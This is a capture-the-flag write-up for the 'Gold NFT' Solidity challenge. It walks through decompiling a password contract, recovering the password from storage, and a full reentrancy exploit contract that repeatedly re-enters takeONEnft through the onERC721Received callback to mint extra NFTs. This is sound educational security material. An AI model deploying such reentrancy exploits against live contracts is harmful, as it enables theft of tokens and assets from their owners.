# Gold NFT

## Challenge

We receive the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC721} from "lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";

interface IPassManager {
    function read(bytes32) external returns (bool);
}

contract GoldNFT is ERC721("GoldNFT", "GoldNFT") {
    uint lastTokenId;
    bool minted;

    function takeONEnft(bytes32 password) external {
        require(
            IPassManager(0xe43029d90B47Dd47611BAd91f24F87Bc9a03AEC2).read(
                password
            ),
            "wrong pass"
        );

        if (!minted) {
            lastTokenId++;
            _safeMint(msg.sender, lastTokenId);
            minted = true;
        } else revert("already minted");
    }
}
```

and our goal is to mint more than 10 NFTs.

## Solution

First we want to find out what the PassManager really does. So i took a look at the bytecode and decompile it using Paleoramix (the one included in etherscan). Then we get back:

```solidity
# Palkeoramix decompiler. 

def read(bytes32 _currency) payable: 
  require calldata.size - 4 >=ΓÇ▓ 32
  require _currency == _currency
  return bool(stor[_currency])

#
#  Regular functions
#

def _fallback() payable: # default function
  revert

def set(bytes32 _param1, bool _param2) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _param1 == _param1
  require _param2 == _param2
  require caller == 3
  stor[_param1] = _param2
```

I then tried to clean up the code so it's better understandable.

```solidity
function read(bytes32 _currency) payable
{
  return bool(storage[_currency]);
}
  
function set(bytes32 _param1, bool _param2) payable
{
  require(caller == owner);
  storage[_param1] = _param2;
}
```

So the read functions checks if a certain storage slot has been set to something else then 0. So i looked at the contract creation in etherscan. There we can see that the storage slot at 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe was set to 1. So this is probably the password.

Then i wrote a attack script that exploits the reentrancy attack in _safeMint. The case is that with _safeMint we have to implement the on onERC721Received from which we can reenter. Then we just reenter until we got our 10 NFTs

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./GoldNFT.sol";

contract exploiter {
    uint256 claims;
    GoldNFT NFT_contract;
    bytes32 password = 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe;
    uint256 target_claims = 10;
    address owner;
    uint256[] public tokenIds;

    constructor(address target_addr)
    {
        owner = msg.sender;
        claims = 0; 
        NFT_contract = GoldNFT(target_addr);
    }

    function attack() payable public
    {
        NFT_contract.takeONEnft(password);

        for (uint256 i = 0; i < target_claims; i++)
        {
            NFT_contract.transferFrom(address(this), owner, tokenIds[i]);
        }
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4)
    {
        tokenIds.push(tokenId);
        if (claims < target_claims)
        {
            claims += 1;
            NFT_contract.takeONEnft(password);
        }

        return this.onERC721Received.selector;
    }
}
```

The POC can be found in this folder. 